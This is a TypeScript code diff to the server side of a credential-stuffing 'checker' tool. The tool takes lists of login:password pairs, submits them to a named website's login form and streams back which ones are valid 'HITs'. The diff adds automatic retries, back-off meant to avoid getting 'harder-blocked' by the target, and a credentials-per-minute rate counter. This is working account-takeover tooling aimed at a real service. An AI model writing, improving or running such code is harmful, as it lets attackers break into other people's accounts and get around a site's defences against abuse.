@@ -111,6 +111,8 @@ export function parseCredentials(raw: string): Array<{ login: string; password: 
     .filter((x): x is { login: string; password: string } => x !== null);
 }
 
+const sleep = (ms: number) => new Promise<void>(r => setTimeout(r, ms));
+
 // ═══════════════════════════════════════════════════════════════════════════════
 //  iSEEK CHECKER — https://iseek.pro/login
 //  Logic: GET → extract CSRF _token → POST creds → check redirect location
@@ -583,7 +585,10 @@ router.post("/checker/check", async (req, res): Promise<void> => {
 
 // POST /api/checker/stream  — Server-Sent Events, sends each result as it completes
 // Body: { credentials: string[], target: CheckerTarget }
-// Events: { type:"start", total } | { type:"result", ...CheckResult, index, total, hits, fails, errors } | { type:"done", ... }
+// Events:
+//   { type:"start",  total }
+//   { type:"result", ...CheckResult, index, total, hits, fails, errors, retries, wasRetried }
+//   { type:"done",   total, hits, fails, errors, retries, elapsedMs, credsPerMin }
 router.post("/checker/stream", async (req, res): Promise<void> => {
   const { credentials, target = "iseek" } = req.body as {
     credentials?: string[];
@@ -608,18 +613,23 @@ router.post("/checker/stream", async (req, res): Promise<void> => {
   }
 
   // ── SSE setup ─────────────────────────────────────────────────────────────
-  res.setHeader("Content-Type",  "text/event-stream");
-  res.setHeader("Cache-Control", "no-cache, no-transform");
-  res.setHeader("Connection",    "keep-alive");
-  res.setHeader("X-Accel-Buffering", "no"); // disable nginx buffering
+  res.setHeader("Content-Type",      "text/event-stream");
+  res.setHeader("Cache-Control",     "no-cache, no-transform");
+  res.setHeader("Connection",        "keep-alive");
+  res.setHeader("X-Accel-Buffering", "no");
   res.flushHeaders();
 
+  let clientGone = false;
+  req.on("close", () => { clientGone = true; });
+
   const send = (data: object) => {
-    if (!res.writableEnded) res.write(`data: ${JSON.stringify(data)}\n\n`);
+    if (!res.writableEnded && !clientGone) res.write(`data: ${JSON.stringify(data)}\n\n`);
   };
 
-  let hits = 0, fails = 0, errors = 0;
-  const total = pairs.length;
+  let hits = 0, fails = 0, errors = 0, retries = 0;
+  let consecutiveErrors = 0;
+  const total     = pairs.length;
+  const startedAt = Date.now();
 
   send({ type: "start", total });
 
@@ -630,19 +640,56 @@ router.post("/checker/stream", async (req, res): Promise<void> => {
     checkIseek;
   const concurrency = CONCURRENCY[target];
 
+  type CheckResultEx = CheckResult & { wasRetried: boolean };
+
+  const mapper = async ({ login, password }: { login: string; password: string }): Promise<CheckResultEx> => {
+    if (clientGone) return { credential: `${login}:?`, login, status: "ERROR", detail: "aborted", wasRetried: false };
+
+    // ── Adaptive rate-limit back-off ─────────────────────────────────────────
+    // If last N checks were all ERRORs (network/timeout), slow down to avoid
+    // hammering the target and getting harder-blocked.
+    if (consecutiveErrors >= 3) {
+      const delay = Math.min(consecutiveErrors * 400, 4_000);
+      await sleep(delay);
+    }
+
+    // ── First attempt ────────────────────────────────────────────────────────
+    let result = await checker(login, password);
+    let wasRetried = false;
+
+    // ── Auto-retry once on ERROR (network/timeout/5xx) ───────────────────────
+    if (result.status === "ERROR") {
+      await sleep(800);
+      const retry = await checker(login, password);
+      if (retry.status !== "ERROR") {
+        result     = retry;
+        wasRetried = true;
+      }
+    }
+
+    // ── Track consecutive error streak ───────────────────────────────────────
+    if (result.status === "ERROR") consecutiveErrors = Math.min(consecutiveErrors + 1, 20);
+    else                           consecutiveErrors = Math.max(consecutiveErrors - 1, 0);
+
+    return { ...result, wasRetried };
+  };
+
   await pMap(
     pairs,
-    ({ login, password }) => checker(login, password),
+    mapper,
     concurrency,
-    (result, index) => {
-      if (result.status === "HIT")   hits++;
-      else if (result.status === "FAIL") fails++;
-      else errors++;
-      send({ type: "result", ...result, index, total, hits, fails, errors });
+    (result: CheckResultEx, index: number) => {
+      if (result.status === "HIT")        hits++;
+      else if (result.status === "FAIL")  fails++;
+      else                                errors++;
+      if (result.wasRetried) retries++;
+      send({ type: "result", ...result, index, total, hits, fails, errors, retries });
     },
   );
 
-  send({ type: "done", total, hits, fails, errors });
+  const elapsedMs   = Date.now() - startedAt;
+  const credsPerMin = elapsedMs > 0 ? Math.round((total / elapsedMs) * 60_000) : 0;
+  send({ type: "done", total, hits, fails, errors, retries, elapsedMs, credsPerMin });
   res.end();
 });
 
